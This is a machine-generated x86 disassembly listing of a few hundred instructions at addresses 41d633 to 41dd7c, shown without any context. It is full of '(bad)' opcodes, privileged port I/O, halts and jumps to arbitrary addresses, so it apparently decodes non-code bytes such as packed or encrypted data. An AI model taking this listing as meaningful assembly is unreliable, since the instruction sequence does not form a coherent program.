  41d633:	hlt    
  41d634:	ins    BYTE PTR es:[edi],dx
  41d635:	xchg   edi,eax
  41d636:	mov    ebx,0xfce88051
  41d63b:	dec    edi
  41d63c:	fld    DWORD PTR [eax+0x6f]
  41d63f:	mov    al,0xa5
  41d641:	lahf   
  41d642:	in     al,0x4e
  41d644:	neg    DWORD PTR [ecx-0x2541728e]
  41d64a:	clc    
  41d64b:	or     al,0xfc
  41d64d:	fld    TBYTE PTR [eax+0x7a]
  41d650:	jl     0x41d602
  41d652:	jbe    0x41d69d
  41d654:	jae    0x41d6bc
  41d656:	and    bl,ch
  41d658:	lods   eax,DWORD PTR ds:[esi]
  41d659:	xchg   esi,eax
  41d65a:	mov    edi,0xb2fb86ba
  41d65f:	repnz mov eax,ds:0x463d4367
  41d665:	jo     0x41d6db
  41d667:	add    esp,DWORD PTR [edx]
  41d669:	jo     0x41d6ac
  41d66b:	ins    BYTE PTR es:[edi],dx
  41d66c:	not    DWORD PTR [esi-0x2ad8b673]
  41d672:	pusha  
  41d673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d674:	popf   
  41d675:	mov    al,0x28
  41d677:	push   esi
  41d678:	fnstenv [esi+0x1a]
  41d67b:	add    eax,0xc27e4402
  41d680:	retf   0x5119
  41d683:	retf   
  41d684:	push   ss
  41d685:	xchg   esi,eax
  41d686:	pushf  
  41d687:	xchg   edi,eax
  41d688:	imul   ecx,esp,0xccfa0a6d
  41d68e:	sub    eax,0x7c139e9e
  41d693:	cs pushf 
  41d695:	sub    bh,BYTE PTR [ebp-0x1]
  41d698:	xor    al,BYTE PTR [edi+0x35]
  41d69b:	mov    esp,0x1ea56f57
  41d6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a1:	mov    bh,0x65
  41d6a3:	aaa    
  41d6a4:	xor    BYTE PTR [ebp+ecx*8+0x2294b1e0],bl
  41d6ab:	cwde   
  41d6ac:	ss pusha 
  41d6ae:	fbld   TBYTE PTR [ebp+0x4a95f9a7]
  41d6b4:	stos   DWORD PTR es:[edi],eax
  41d6b5:	shl    BYTE PTR [ebx-0x70],cl
  41d6b8:	imul   eax,DWORD PTR [ecx],0x46
  41d6bb:	unpcklps xmm5,XMMWORD PTR [ebp+0x29]
  41d6bf:	hlt    
  41d6c0:	je     0x41d6f7
  41d6c2:	pop    ecx
  41d6c3:	inc    edi
  41d6c5:	pop    ecx
  41d6c6:	mov    DWORD PTR gs:[edi],ebx
  41d6c9:	jge    0x41d66b
  41d6cb:	fst    QWORD PTR [ecx+0x1b]
  41d6ce:	rcr    bh,0xde
  41d6d1:	popa   
  41d6d2:	ins    DWORD PTR es:[edi],dx
  41d6d3:	adc    ecx,esi
  41d6d5:	(bad)  
  41d6d6:	jnp    0x41d6b7
  41d6d8:	dec    edi
  41d6d9:	icebp  
  41d6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6db:	sub    DWORD PTR [ecx-0x4197a140],eax
  41d6e1:	mov    ebx,0xbfac63f4
  41d6e6:	imul   edi,DWORD PTR [ecx-0x80],0x6ff1db39
  41d6ed:	retf   
  41d6ee:	cli    
  41d6ef:	outs   dx,DWORD PTR ds:[esi]
  41d6f0:	leave  
  41d6f1:	fisttp QWORD PTR [edx]
  41d6f3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f5:	mov    ss,WORD PTR [ebx-0x385cea03]
  41d6fb:	dec    esi
  41d6fc:	mov    al,BYTE PTR [ecx-0x5a]
  41d6ff:	lock or eax,0x7ffcf39d
  41d705:	outs   dx,BYTE PTR ds:[esi]
  41d706:	add    al,0x3e
  41d708:	scas   eax,DWORD PTR es:[edi]
  41d709:	(bad)  [ebp+0x1c]
  41d70c:	je     0x41d720
  41d70e:	cmc    
  41d70f:	stos   BYTE PTR es:[edi],al
  41d710:	and    al,0xf3
  41d712:	push   0xfffffff5
  41d714:	outs   dx,BYTE PTR ds:[esi]
  41d715:	es mov al,0xa5
  41d718:	shl    ebp,1
  41d71a:	dec    eax
  41d71b:	retf   0x9704
  41d71e:	imul   esp,eax,0x5e2d5b7e
  41d724:	sub    eax,0x4b8bc0ad
  41d729:	push   eax
  41d72a:	ret    0xaac2
  41d72d:	adc    dh,cl
  41d72f:	mov    al,ds:0x8e231009
  41d734:	jmp    0xea4b3cc7
  41d739:	outs   dx,BYTE PTR ds:[esi]
  41d73a:	push   ds
  41d73b:	outs   dx,DWORD PTR ds:[esi]
  41d73c:	ret    
  41d73d:	popf   
  41d73e:	pop    ebp
  41d73f:	nop
  41d740:	test   DWORD PTR [edi-0x4d3d920a],esi
  41d746:	and    ecx,DWORD PTR [esi+0xa]
  41d749:	add    eax,0x9e29fd1f
  41d74e:	icebp  
  41d74f:	xor    eax,0x77af2593
  41d754:	loop   0x41d7c7
  41d756:	jb     0x41d6f9
  41d758:	sti    
  41d759:	daa    
  41d75a:	call   0xc7fa2605
  41d75f:	test   DWORD PTR [edx],esi
  41d761:	mov    ch,0xed
  41d763:	outs   dx,BYTE PTR ds:[esi]
  41d764:	leave  
  41d765:	xor    eax,0xcbb545e
  41d76a:	and    BYTE PTR [ebx-0x77],bh
  41d76d:	pop    ebx
  41d76e:	bound  eax,QWORD PTR [edx-0x749ec983]
  41d774:	xchg   edx,eax
  41d775:	mov    cl,0x7c
  41d777:	retf   
  41d778:	xchg   edi,eax
  41d779:	sub    eax,ebp
  41d77b:	xor    eax,0xdb7a890
  41d780:	setnp  BYTE PTR [ebp-0x70]
  41d784:	mov    al,ds:0xe8ee2e71
  41d789:	popw   ss
  41d78b:	leave  
  41d78c:	ins    BYTE PTR es:[edi],dx
  41d78d:	jecxz  0x41d7a8
  41d78f:	sbb    edi,esp
  41d791:	std    
  41d792:	jnp    0x41d7ac
  41d794:	xchg   edx,eax
  41d795:	popf   
  41d796:	cs call 0x8274:0x1e2b4c61
  41d79e:	push   edx
  41d79f:	enter  0x18d6,0x22
  41d7a3:	fcom   QWORD PTR [eax+eiz*8]
  41d7a6:	xchg   BYTE PTR [eax+0x4e7b18f9],dl
  41d7ac:	push   edi
  41d7ad:	cmc    
  41d7ae:	xchg   ecx,eax
  41d7af:	or     BYTE PTR [eax],dl
  41d7b1:	or     BYTE PTR [ecx],dh
  41d7b3:	mov    ch,0x60
  41d7b5:	enter  0x4c78,0xac
  41d7b9:	pusha  
  41d7ba:	xchg   ecx,eax
  41d7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7bc:	aaa    
  41d7bd:	xor    ebp,DWORD PTR [esi]
  41d7bf:	ret    0x2a
  41d7c2:	mov    al,0xf3
  41d7c4:	sbb    DWORD PTR ds:0xd79def87,0xffffff92
  41d7cb:	xchg   esi,eax
  41d7cc:	rol    bh,1
  41d7ce:	mov    eax,0x61ec3200
  41d7d3:	fdiv   st(0),st
  41d7d5:	cwde   
  41d7d6:	(bad)  
  41d7d7:	(bad)  
  41d7d8:	push   ss
  41d7d9:	cli    
  41d7da:	add    al,0xbd
  41d7dc:	pop    ebp
  41d7dd:	push   edi
  41d7de:	sub    al,BYTE PTR [ecx-0x48]
  41d7e1:	cmp    DWORD PTR [edi+0x66],0x5b
  41d7e5:	in     al,0xb0
  41d7e7:	cmp    al,0xa9
  41d7e9:	(bad)  
  41d7ea:	fldcw  WORD PTR [edx]
  41d7ec:	lods   eax,DWORD PTR ds:[esi]
  41d7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ee:	aas    
  41d7ef:	xchg   esp,eax
  41d7f0:	cmp    ecx,DWORD PTR [ebp-0x6]
  41d7f3:	push   0x33
  41d7f5:	das    
  41d7f6:	dec    edi
  41d7f7:	mov    dl,0x1b
  41d7f9:	push   cs
  41d7fa:	xchg   ebx,eax
  41d7fb:	rol    BYTE PTR [ebp-0x21544ad3],cl
  41d801:	mov    ah,0xb5
  41d803:	jns    0x41d7c0
  41d805:	retf   0x1469
  41d808:	push   ebp
  41d809:	rcl    DWORD PTR ds:0xe0c78941,0x6d
  41d810:	jle    0x41d7fa
  41d812:	push   esp
  41d813:	cli    
  41d814:	les    edi,FWORD PTR [ebp+ecx*2+0x7d]
  41d818:	ret    
  41d819:	cmp    al,0xc7
  41d81b:	das    
  41d81c:	test   BYTE PTR [ecx],0x3c
  41d81f:	cmp    eax,0x5640667c
  41d824:	push   ebp
  41d825:	mov    edx,0x326557be
  41d82a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d82b:	test   ebx,edi
  41d82d:	je     0x41d7b2
  41d82f:	mov    bh,0xd
  41d831:	outs   dx,BYTE PTR ds:[esi]
  41d832:	and    eax,0x447cd4de
  41d837:	(bad)  
  41d838:	cmp    DWORD PTR [eax],edx
  41d83a:	mov    cl,BYTE PTR [ebx]
  41d83c:	enter  0x12c7,0x59
  41d840:	xlat   BYTE PTR ds:[ebx]
  41d841:	mov    dh,0x43
  41d843:	ss inc eax
  41d845:	test   BYTE PTR [esi],0xa7
  41d848:	xchg   DWORD PTR [eax+0x10d5e971],ebp
  41d84e:	adc    edx,DWORD PTR [ebx+0x64d5b51e]
  41d854:	and    BYTE PTR [edi+0x8],cl
  41d857:	loope  0x41d878
  41d859:	cmp    BYTE PTR [edi-0x54],dh
  41d85c:	push   cs
  41d85d:	pop    ds
  41d85e:	sbb    DWORD PTR [esi+0x54],0xffffffb4
  41d862:	mov    bh,0x2f
  41d864:	loopne 0x41d803
  41d866:	ror    DWORD PTR [eax-0x8],cl
  41d869:	cmp    al,0x7c
  41d86b:	rol    BYTE PTR [edi+edx*1],0xbd
  41d86f:	pushw  ss
  41d871:	or     DWORD PTR [edx-0x10714784],0xf437b804
  41d87b:	daa    
  41d87c:	je     0x41d82b
  41d87e:	sub    eax,0xc8e3c602
  41d883:	loopne 0x41d853
  41d885:	and    eax,0x2d6da17f
  41d88a:	xor    BYTE PTR [ecx+0x7c],ah
  41d88d:	ret    0x355e
  41d890:	aaa    
  41d891:	pop    esp
  41d892:	inc    ebp
  41d893:	inc    ecx
  41d894:	call   0x7e116802
  41d899:	fiadd  WORD PTR [esi+0x3c]
  41d89c:	inc    esp
  41d89d:	cdq    
  41d89e:	lods   eax,DWORD PTR ds:[esi]
  41d89f:	je     0x41d87a
  41d8a1:	shr    DWORD PTR [ebx],0xd2
  41d8a4:	mov    ch,0xd8
  41d8a6:	xlat   BYTE PTR ds:[ebx]
  41d8a7:	xchg   esi,eax
  41d8a8:	pop    ebx
  41d8a9:	sub    DWORD PTR ds:0x9a3e4232,ecx
  41d8af:	jmp    0x41d922
  41d8b1:	pop    eax
  41d8b2:	retf   
  41d8b3:	xchg   ebx,eax
  41d8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b5:	popf   
  41d8b6:	or     al,0xdd
  41d8b8:	div    DWORD PTR [ebp-0x5e]
  41d8bb:	loop   0x41d8df
  41d8bd:	fwait
  41d8be:	or     eax,0x4e01eefe
  41d8c3:	fwait
  41d8c4:	jmp    0x41d8bb
  41d8c6:	leave  
  41d8c7:	das    
  41d8c8:	pop    es
  41d8c9:	mov    esi,0xc6c11909
  41d8ce:	ror    DWORD PTR [edi+0x168d0d7c],cl
  41d8d4:	jle    0x41d8ae
  41d8d6:	add    al,0xc6
  41d8d8:	popa   
  41d8d9:	jmp    0x41d88b
  41d8db:	imul   ebx,edx,0x4eae97cd
  41d8e1:	dec    ebp
  41d8e2:	xor    bl,BYTE PTR [eax-0x70]
  41d8e5:	arpl   WORD PTR [ebx+0x238da9c1],bp
  41d8eb:	sub    BYTE PTR [edx+0x5a019fd6],cl
  41d8f1:	arpl   WORD PTR [edx],sp
  41d8f3:	pop    ebx
  41d8f4:	jb     0x41d8dd
  41d8f6:	rcl    DWORD PTR [eax+0x67ba857b],0x8e
  41d8fd:	push   0xfffffffc
  41d8ff:	inc    BYTE PTR [edi+0x79c45267]
  41d905:	cs out dx,eax
  41d907:	loopne 0x41d89d
  41d909:	stos   BYTE PTR es:[edi],al
  41d90a:	sub    BYTE PTR [edx+edx*2+0x2d],dl
  41d90e:	pusha  
  41d90f:	pop    ebp
  41d910:	mov    eax,0xd9c22a18
  41d915:	dec    edx
  41d916:	inc    esi
  41d917:	mov    al,BYTE PTR [esi-0x477e33d5]
  41d91d:	fsub   st(0),st
  41d91f:	inc    ebx
  41d920:	xor    esi,0x90ca4a95
  41d926:	cmp    DWORD PTR [edx+ecx*4+0x7],0xbfeffdd6
  41d92e:	xor    dl,BYTE PTR [edi-0x53236f3e]
  41d934:	mov    WORD PTR [esp+ebx*8+0x66],fs
  41d938:	xchg   ah,bl
  41d93a:	jge    0x41d9ab
  41d93c:	in     al,dx
  41d93d:	outs   dx,BYTE PTR ds:[esi]
  41d93e:	push   ss
  41d93f:	outs   dx,BYTE PTR ds:[esi]
  41d940:	mov    ds:0x5dcae9bd,eax
  41d945:	rcr    BYTE PTR [eax-0x22],1
  41d948:	mov    bl,0x7d
  41d94a:	(bad)  
  41d94b:	fmulp  st(4),st
  41d94d:	mov    fs,eax
  41d94f:	cmp    bl,cl
  41d951:	adc    bl,BYTE PTR [ebx]
  41d953:	js     0x41d9ab
  41d955:	mov    dh,0xd5
  41d957:	retf   
  41d958:	mov    ebx,0x1efd3df
  41d95d:	in     al,dx
  41d95e:	cld    
  41d95f:	pop    edx
  41d960:	xor    cl,BYTE PTR [ebp-0x60]
  41d963:	loope  0x41d95e
  41d965:	arpl   ax,bp
  41d967:	popa   
  41d968:	and    BYTE PTR [esi+0x3af270ff],dh
  41d96e:	sar    BYTE PTR gs:[ecx+0x3c],0xb9
  41d973:	mov    dl,0x54
  41d975:	ret    
  41d976:	inc    ecx
  41d977:	ins    DWORD PTR es:[edi],dx
  41d978:	outs   dx,DWORD PTR ds:[esi]
  41d979:	outs   dx,DWORD PTR cs:[esi]
  41d97b:	inc    ebx
  41d97c:	repz test al,0xd9
  41d97f:	mov    eax,0xe8bc7cf9
  41d984:	jmp    0x3239:0x550587e0
  41d98b:	sbb    DWORD PTR [ebx],0xffffffa6
  41d98e:	adc    BYTE PTR [ecx+0xbf7c576],bh
  41d994:	cwde   
  41d995:	add    cl,0x68
  41d998:	adc    eax,0x9f445861
  41d99d:	and    edx,ebp
  41d99f:	leave  
  41d9a0:	aas    
  41d9a1:	out    0xea,al
  41d9a3:	aad    0x80
  41d9a5:	out    0xd4,al
  41d9a7:	mov    ds:0x5cb13c32,eax
  41d9ac:	fcom   QWORD PTR [ebx]
  41d9ae:	mov    cl,0x31
  41d9b0:	aad    0xd5
  41d9b2:	pop    ecx
  41d9b3:	(bad)  
  41d9b4:	das    
  41d9b5:	stos   BYTE PTR es:[edi],al
  41d9b6:	mov    dl,0xab
  41d9b8:	sbb    edx,esp
  41d9ba:	mov    bh,0x81
  41d9bc:	cmp    eax,0x2dbe8319
  41d9c1:	in     al,dx
  41d9c2:	js     0x41d9fb
  41d9c4:	xor    edx,DWORD PTR [esi]
  41d9c6:	leave  
  41d9c7:	ins    BYTE PTR es:[edi],dx
  41d9c8:	js     0x41d9d9
  41d9ca:	or     bh,BYTE PTR [ebx+0x70]
  41d9cd:	in     al,0xcf
  41d9cf:	mov    eax,ds:0x9b352c1b
  41d9d4:	lds    edi,FWORD PTR [ecx]
  41d9d6:	popa   
  41d9d7:	inc    ecx
  41d9d8:	rol    BYTE PTR [edi+0x75],1
  41d9db:	dec    esp
  41d9dc:	xchg   DWORD PTR [ecx],ebx
  41d9de:	inc    ecx
  41d9df:	sub    al,0xb6
  41d9e1:	into   
  41d9e2:	imul   ebp,DWORD PTR [ecx-0x207a7cc5],0xffffffa8
  41d9e9:	mov    ebp,0xe41ba968
  41d9ee:	or     BYTE PTR [eax-0x4c2f76e3],cl
  41d9f4:	sbb    ah,BYTE PTR [eax+0x7f]
  41d9f7:	sti    
  41d9f8:	push   0x2e
  41d9fa:	(bad)  
  41d9fb:	outs   dx,BYTE PTR ds:[esi]
  41d9fc:	xchg   edi,eax
  41d9fd:	sbb    dl,BYTE PTR [edx]
  41d9ff:	fisttp WORD PTR ds:0x2ed50294
  41da05:	adc    eax,0x52c639c8
  41da0a:	ins    DWORD PTR es:[edi],dx
  41da0b:	repz jle 0x41da3b
  41da0e:	push   edi
  41da0f:	sahf   
  41da10:	push   es
  41da11:	dec    edx
  41da12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da13:	imul   edi,DWORD PTR [ecx],0xfbbdccd6
  41da19:	outs   dx,BYTE PTR ds:[esi]
  41da1a:	shl    BYTE PTR [ebp+0x72],cl
  41da1d:	push   ebp
  41da1e:	cdq    
  41da1f:	ror    BYTE PTR [ebx],1
  41da21:	mov    ds:0xf89b8c63,al
  41da26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da27:	in     eax,dx
  41da28:	pop    ebp
  41da29:	test   DWORD PTR [ebx],edx
  41da2b:	sbb    BYTE PTR [edx],al
  41da2d:	(bad)  [eax+0xd738326]
  41da33:	mov    al,ds:0x3a807c7
  41da38:	sbb    ebp,DWORD PTR [ebx+ebp*4-0x66]
  41da3c:	xor    edi,DWORD PTR [edx+0x75]
  41da3f:	loopne 0x41da5d
  41da41:	or     al,BYTE PTR [edi-0x2d4c9a30]
  41da47:	mov    edx,0xeebe953c
  41da4c:	fwait
  41da4d:	stc    
  41da4e:	mov    ds:0xc58b951c,eax
  41da53:	clc    
  41da54:	es icebp 
  41da56:	jne    0x41da5d
  41da58:	ret    0x14a5
  41da5b:	hlt    
  41da5c:	outs   dx,BYTE PTR ds:[esi]
  41da5d:	xchg   esi,eax
  41da5e:	test   eax,0x5bc11b90
  41da63:	rcr    DWORD PTR [edi-0x7c412ac1],cl
  41da69:	loop   0x41d9eb
  41da6b:	mov    eax,ds:0x9cc9346a
  41da70:	cmp    eax,0x32279111
  41da75:	dec    eax
  41da76:	fild   WORD PTR [ebx]
  41da78:	call   0x94768fa
  41da7d:	bound  ebx,QWORD PTR [eax+0x7702ab1]
  41da83:	outs   dx,DWORD PTR ds:[esi]
  41da84:	push   esi
  41da85:	lods   eax,DWORD PTR ds:[esi]
  41da86:	jg     0x41dac4
  41da88:	dec    ebp
  41da89:	or     ecx,DWORD PTR [esi+0x1e080a89]
  41da8f:	cwde   
  41da90:	adc    DWORD PTR [ecx],edi
  41da92:	add    DWORD PTR [eax],0xffffffde
  41da95:	(bad)  
  41da96:	mov    eax,ds:0xe892062e
  41da9b:	mov    al,ds:0xbd6271d7
  41daa0:	jl     0x41db20
  41daa2:	adc    al,0xa6
  41daa4:	(bad)  
  41daa5:	jp     0x41da4f
  41daa7:	sub    al,0xf
  41daa9:	daa    
  41daaa:	cmova  ebx,DWORD PTR [ebp+0x4f0ed282]
  41dab1:	adc    BYTE PTR [ecx+0x52],dh
  41dab4:	sub    DWORD PTR [edx],ecx
  41dab6:	and    ch,BYTE PTR [ebx+0x5f1580a6]
  41dabc:	jge    0x41dab7
  41dabe:	jbe    0x41dabb
  41dac0:	add    ebp,0x22fb32ca
  41dac6:	push   eax
  41dac7:	rcr    BYTE PTR [esi-0x25],0x3c
  41dacb:	loope  0x41da62
  41dacd:	(bad)  
  41dace:	push   edx
  41dacf:	inc    eax
  41dad0:	push   ebp
  41dad1:	sahf   
  41dad2:	and    dl,BYTE PTR [esi+0x5c]
  41dad5:	(bad)  
  41dad6:	imul   ebx,DWORD PTR [ecx+0x79bd1f02],0x23f37188
  41dae0:	(bad)  
  41dae2:	popa   
  41dae3:	mov    esp,0x3edc29ef
  41dae8:	out    0xf6,al
  41daea:	cmp    dh,BYTE PTR [eax-0x24]
  41daed:	cli    
  41daee:	scas   eax,DWORD PTR es:[edi]
  41daef:	mov    ds:0xa07c406b,al
  41daf4:	sub    cl,BYTE PTR [ecx-0x5da63844]
  41dafa:	mov    ecx,0xd350fa33
  41daff:	nop
  41db00:	idiv   DWORD PTR [ebp+0x6f443ba5]
  41db06:	imul   eax,DWORD PTR [ebx],0x6217fd4f
  41db0c:	add    ch,BYTE PTR [edi+ebp*1]
  41db0f:	fmul   QWORD PTR [edx-0x43942cac]
  41db15:	cmp    ecx,edi
  41db17:	mov    ecx,DWORD PTR [ecx+0x26]
  41db1a:	fisubr DWORD PTR [ebx+0x4a]
  41db1d:	dec    ebx
  41db1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db1f:	adc    eax,0x6a473449
  41db24:	and    DWORD PTR [edi+0x2],edi
  41db27:	scas   al,BYTE PTR es:[edi]
  41db28:	in     al,0x85
  41db2a:	in     eax,0x9a
  41db2c:	mov    esi,0x11d228d
  41db31:	push   ds
  41db32:	sub    BYTE PTR [edx-0x7d],al
  41db35:	iret   
  41db36:	dec    edx
  41db37:	or     eax,0x7583d94
  41db3c:	aad    0x61
  41db3e:	jge    0x41db89
  41db40:	inc    edx
  41db41:	int3   
  41db42:	imul   ebp,edx,0xa7568fcb
  41db48:	or     BYTE PTR [ebp+0x7c],al
  41db4b:	mov    esp,0xbe274b35
  41db50:	cmp    eax,DWORD PTR [ebp-0x730d09e0]
  41db56:	xchg   edx,eax
  41db57:	shr    BYTE PTR [edx+0x1c6f639],1
  41db5d:	bound  ebx,QWORD PTR ds:0x2eac0227
  41db63:	retf   
  41db64:	push   cs
  41db65:	xchg   esi,eax
  41db66:	jbe    0x41db2a
  41db68:	cwde   
  41db69:	out    dx,al
  41db6a:	jmp    0x6cde4594
  41db6f:	les    ebp,FWORD PTR [edi+edx*1+0x29749155]
  41db76:	icebp  
  41db77:	call   0x3ed3:0x1b8c84db
  41db7e:	imul   edi,DWORD PTR [ebp-0x2c],0xffffffc2
  41db82:	int3   
  41db83:	jbe    0x41db39
  41db85:	xor    al,0xbd
  41db87:	arpl   WORD PTR [edx],ax
  41db89:	add    al,0x82
  41db8b:	inc    edx
  41db8c:	xor    ebx,DWORD PTR [esi]
  41db8e:	xor    edx,esp
  41db90:	dec    edi
  41db91:	add    BYTE PTR [esi+ecx*1+0x2b],0xee
  41db96:	imul   eax,DWORD PTR [ebx-0x8a10a54],0x6d083bd3
  41dba0:	sub    BYTE PTR [edi-0x1f9840df],ah
  41dba6:	shl    BYTE PTR [edx-0x4863fffb],cl
  41dbac:	adc    ebx,ebx
  41dbae:	jnp    0x41db41
  41dbb0:	stos   DWORD PTR es:[edi],eax
  41dbb1:	push   edx
  41dbb2:	ret    
  41dbb3:	aad    0xa0
  41dbb5:	jl     0x41dc26
  41dbb7:	ss jns 0x41dbd0
  41dbba:	sbb    eax,0xede45b01
  41dbbf:	fisubr WORD PTR [esi+0x18]
  41dbc2:	cmp    bh,BYTE PTR [ecx]
  41dbc4:	jge    0x41dba6
  41dbc6:	sbb    DWORD PTR [ebx],0x157b0f11
  41dbcc:	dec    esi
  41dbcd:	sub    DWORD PTR [ecx+edx*2],edi
  41dbd0:	cmc    
  41dbd1:	xor    DWORD PTR [edx],ebx
  41dbd3:	aaa    
  41dbd4:	js     0x41dbc1
  41dbd6:	push   ds
  41dbd7:	xor    al,0x8c
  41dbd9:	sub    esp,ebp
  41dbdb:	nop
  41dbdc:	cmp    BYTE PTR ds:0xb785517b,ah
  41dbe2:	ror    esi,cl
  41dbe4:	outs   dx,BYTE PTR ds:[esi]
  41dbe5:	mov    ecx,0xb8bc6b94
  41dbea:	mov    DWORD PTR [ebx],ebp
  41dbec:	loop   0x41dc32
  41dbee:	mov    bh,0xf8
  41dbf0:	and    eax,ebx
  41dbf2:	mov    bl,0x34
  41dbf4:	xor    DWORD PTR [edi],edi
  41dbf6:	fadd   DWORD PTR [edx+ebp*2-0x6]
  41dbfa:	stos   BYTE PTR es:[edi],al
  41dbfb:	pop    edi
  41dbfd:	cwde   
  41dbfe:	dec    BYTE PTR [ebx]
  41dc00:	mov    ds:0x98df526f,al
  41dc05:	stos   BYTE PTR es:[edi],al
  41dc06:	xor    BYTE PTR [ebx+0x1324cabb],0xee
  41dc0d:	fisubr DWORD PTR [edi-0x3]
  41dc10:	add    dl,BYTE PTR [edx-0x4e15c43c]
  41dc16:	push   edi
  41dc18:	cmp    BYTE PTR [ebx+eiz*4],al
  41dc1b:	shl    BYTE PTR [esi],1
  41dc1d:	push   ebx
  41dc1e:	ins    BYTE PTR es:[edi],dx
  41dc1f:	or     al,BYTE PTR [ebx]
  41dc21:	rcl    DWORD PTR [esi-0x1f],1
  41dc24:	stc    
  41dc25:	and    ecx,DWORD PTR [ecx-0x12]
  41dc28:	cmp    eax,0xd23524d0
  41dc2d:	adc    eax,0x178b355f
  41dc32:	xor    al,BYTE PTR [edi]
  41dc34:	xchg   ebp,eax
  41dc35:	or     DWORD PTR [edi+0x52],ecx
  41dc38:	stc    
  41dc39:	inc    edi
  41dc3a:	fdiv   st,st(3)
  41dc3c:	add    esp,DWORD PTR [eax]
  41dc3e:	jl     0x41dbec
  41dc40:	(bad)  
  41dc41:	xor    bh,BYTE PTR [ebx-0x31]
  41dc44:	fnstcw WORD PTR [ebx]
  41dc46:	ss jno 0x41dbef
  41dc49:	dec    ebx
  41dc4a:	mov    dh,0xe5
  41dc4c:	jno    0x41dc3c
  41dc4e:	cmp    al,0x9d
  41dc50:	xchg   ebx,eax
  41dc51:	lock mov bh,BYTE PTR [ecx+0x1c]
  41dc55:	les    edx,FWORD PTR [esi+0x744e84cd]
  41dc5b:	imul   esi,DWORD PTR [edx],0x17fbae5d
  41dc61:	or     al,0x43
  41dc63:	arpl   WORD PTR [ecx-0x6e],dx
  41dc66:	out    0xc6,al
  41dc68:	iret   
  41dc69:	add    DWORD PTR [ebp+0x36],ebx
  41dc6c:	int    0x3e
  41dc6e:	push   edx
  41dc6f:	cmc    
  41dc70:	push   esi
  41dc71:	adc    esp,DWORD PTR [edi+0x1]
  41dc74:	pop    es
  41dc75:	not    DWORD PTR [ebx+0x51cfc7b]
  41dc7b:	pop    ebp
  41dc7c:	xchg   DWORD PTR [ecx],ecx
  41dc7e:	pop    es
  41dc7f:	div    BYTE PTR [edi-0x3]
  41dc82:	fs std 
  41dc84:	(bad)  
  41dc85:	call   0x6f2d0cfb
  41dc8a:	fidiv  WORD PTR [eax-0x7e]
  41dc8d:	mov    ch,0x93
  41dc8f:	ins    DWORD PTR es:[edi],dx
  41dc90:	jbe    0x41dc56
  41dc92:	imul   edx,edi,0x5c15c7de
  41dc98:	sar    DWORD PTR [ebp-0x30],1
  41dc9b:	fnstenv [edi]
  41dc9d:	sub    al,0xbe
  41dc9f:	dec    esi
  41dca0:	sbb    al,al
  41dca2:	dec    ecx
  41dca3:	das    
  41dca4:	xor    eax,0x8d13b6c5
  41dca9:	out    0xbd,al
  41dcab:	and    al,0x6a
  41dcad:	pushf  
  41dcae:	push   0x79
  41dcb0:	enter  0xf8c,0x7
  41dcb4:	aas    
  41dcb5:	sub    edi,ebp
  41dcb7:	cmc    
  41dcb8:	pop    ecx
  41dcb9:	retf   0xf722
  41dcbc:	fadd   QWORD PTR [eax]
  41dcbe:	inc    edi
  41dcbf:	jo     0x41dc71
  41dcc1:	jb     0x41dcea
  41dcc3:	xor    al,0x9d
  41dcc5:	in     al,0x28
  41dcc7:	adc    bl,ah
  41dcc9:	fsqrt  
  41dccb:	addr16 jmp 0x9e67cd56
  41dcd1:	or     ebp,ebp
  41dcd3:	(bad)  
  41dcd5:	sbb    esp,DWORD PTR [ebp+0x52a61093]
  41dcdb:	int    0xb9
  41dcdd:	jecxz  0x41dcca
  41dcdf:	mov    edx,0xfc380e22
  41dce4:	aam    0xc
  41dce6:	icebp  
  41dce7:	sbb    al,0x25
  41dce9:	add    al,0x2e
  41dceb:	cmp    eax,0x395cb2ac
  41dcf0:	retf   0xb853
  41dcf3:	hlt    
  41dcf4:	sub    eax,0xf46729db
  41dcf9:	dec    ebx
  41dcfa:	dec    edi
  41dcfb:	push   ds
  41dcfc:	sahf   
  41dcfd:	mov    esi,0x9bac3c97
  41dd02:	mov    esi,0x38671875
  41dd07:	and    BYTE PTR [ecx-0x29],0x70
  41dd0b:	dec    ebx
  41dd0c:	xchg   esp,eax
  41dd0d:	popf   
  41dd0e:	cmp    eax,ebx
  41dd10:	or     bh,al
  41dd12:	or     eax,0x584a149e
  41dd17:	mov    edx,0xc0236ca7
  41dd1c:	or     cl,BYTE PTR gs:0x5aec771d
  41dd23:	dec    edx
  41dd24:	sub    edi,DWORD PTR [ebx-0x4199a06e]
  41dd2a:	int    0x31
  41dd2c:	int3   
  41dd2d:	ins    DWORD PTR es:[edi],dx
  41dd2e:	aam    0xb6
  41dd30:	std    
  41dd31:	jl     0x41dd6d
  41dd33:	(bad)  [edx-0x2b579ec0]
  41dd39:	sbb    ah,BYTE PTR [edx]
  41dd3b:	mov    WORD PTR [eax+0x600e00bf],ds
  41dd41:	fsub   DWORD PTR [ebx]
  41dd43:	out    dx,eax
  41dd44:	dec    edx
  41dd45:	pop    ebp
  41dd46:	fisub  DWORD PTR [edi+ecx*2]
  41dd49:	mov    ecx,0xaa4c6807
  41dd4e:	and    DWORD PTR [ebp-0x43],eax
  41dd51:	ror    DWORD PTR ss:[esi-0x3d475d52],0xed
  41dd59:	mov    fs,WORD PTR [edx]
  41dd5b:	loopne 0x41dda7
  41dd5d:	push   esp
  41dd5e:	or     ebp,DWORD PTR [ecx+0x1daeed14]
  41dd64:	icebp  
  41dd65:	sahf   
  41dd66:	bound  eax,QWORD PTR [ecx+esi*2+0xf]
  41dd6a:	pop    ebx
  41dd6b:	ins    DWORD PTR es:[edi],dx
  41dd6c:	out    0xa4,al
  41dd6e:	or     al,0x8e
  41dd70:	xor    BYTE PTR [ecx],0x7a
  41dd73:	jo     0x41dcf6
  41dd75:	les    ebx,FWORD PTR [esi-0x55497c44]
  41dd7b:	push   ebp
  41dd7c:	pop    eax
